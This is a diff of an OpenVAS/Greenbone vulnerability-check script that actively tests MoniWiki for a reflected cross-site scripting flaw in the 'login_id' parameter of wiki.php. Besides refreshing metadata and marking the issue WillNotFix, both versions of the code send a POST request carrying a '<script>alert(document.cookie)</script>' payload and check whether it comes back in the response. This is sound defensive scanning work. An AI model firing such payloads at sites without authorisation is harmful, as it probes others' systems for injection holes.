@@ -7,42 +7,49 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902794");
-  script_version("2023-12-13T05:05:23+0000");
+  script_version("2024-06-19T05:05:42+0000");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
+  script_tag(name:"last_modification", value:"2024-06-19 05:05:42 +0000 (Wed, 19 Jun 2024)");
   script_tag(name:"creation_date", value:"2012-02-21 17:36:32 +0530 (Tue, 21 Feb 2012)");
-  script_name("MoniWiki 'login_id' Cross-Site Scripting Vulnerability");
-
-  script_xref(name:"URL", value:"http://secunia.com/advisories/48109");
-  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/17835");
-  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/48109");
-  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109902/moniwiki-xss.txt");
-
+  script_name("MoniWiki <= 1.1.5 'login_id' XSS Vulnerability - Active Check");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2012 Greenbone AG");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
+  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
+                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
+                      "global_settings.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
-  HTML and script code in a user's browser session in context of an affected site.");
+  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/109902/moniwiki-xss.txt");
+  script_xref(name:"URL", value:"https://web.archive.org/web/20121128212512/http://www.securelist.com/en/advisories/48109");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/48109");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/17835");
 
-  script_tag(name:"affected", value:"MoniWiki version 1.1.5 and prior.");
+  script_tag(name:"summary", value:"MoniWiki is prone to a cross-site scripting (XSS)
+  vulnerability.");
+
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");
 
   script_tag(name:"insight", value:"The flaw is due to an input passed to the 'login_id' POST
   parameter in 'wiki.php' (when 'action' is set to 'userform') is not properly
   sanitised before being returned to the user.");
 
-  script_tag(name:"solution", value:"Upgrade to MoniWiki 1.0.9 or later.");
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
+  HTML and script code in a user's browser session in context of an affected site.");
 
-  script_tag(name:"summary", value:"MoniWiki is prone to a cross-site scripting (XSS) vulnerability.");
+  script_tag(name:"affected", value:"MoniWiki version 1.1.5 is known to be affected. Other versions
+  might be affected as well.");
 
-  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
+  options are to upgrade to a newer release, disable respective features, remove the product or
+  replace the product by another one.");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_analysis");
 
-  script_xref(name:"URL", value:"http://moniwiki.kldp.net/wiki.php");
   exit(0);
 }
 
@@ -59,31 +66,31 @@ if(!http_can_host_php(port:port))
 useragent = http_get_user_agent();
 host = http_host_name(port:port);
 
-foreach dir (make_list_unique("/moniwiki", "/MoniWiki", http_cgi_dirs(port:port)))
-{
+foreach dir(make_list_unique("/moniwiki", "/MoniWiki", http_cgi_dirs(port:port))) {
 
-  if(dir == "/") dir = "";
+  if(dir == "/")
+    dir = "";
 
-  rcvRes = http_get_cache(item:string(dir, "/wiki.php"), port:port);
+  res = http_get_cache(item:dir + "/wiki.php", port:port);
+  if(!res || res !~ "^HTTP/1\.[01] 200" || res !~ "(powered by MoniWiki|<wikiHeader>)")
+    continue;
 
-  if(rcvRes && "powered by MoniWiki" >< rcvRes)
-  {
-    postdata = "action=userform&login_id=<script>alert(document.cookie)" +
-               "</script>&password=<script>alert(document.cookie)</script>";
+  data = "action=userform&login_id=<script>alert(document.cookie)</script>&password=<script>alert(document.cookie)</script>";
 
-    monReq = string("POST ", dir, "/wiki.php/FrontPage HTTP/1.1\r\n",
-                    "Host: ", host, "\r\n",
-                    "User-Agent: ", useragent, "\r\n",
-                    "Content-Type: application/x-www-form-urlencoded\r\n",
-                    "Content-Length: ", strlen(postdata), "\r\n",
-                    "\r\n", postdata);
-    monRes = http_keepalive_send_recv(port:port, data:monReq);
+  url = dir + "/wiki.php/FrontPage";
 
-    if(monRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< monRes)
-    {
-      security_message(port:port);
-      exit(0);
-    }
+  req = string("POST ", url, " HTTP/1.1\r\n",
+               "Host: ", host, "\r\n",
+               "User-Agent: ", useragent, "\r\n",
+               "Content-Type: application/x-www-form-urlencoded\r\n",
+               "Content-Length: ", strlen(data), "\r\n",
+               "\r\n", data);
+  res = http_keepalive_send_recv(port:port, data:req);
+
+  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
+    report = http_report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
   }
 }
 
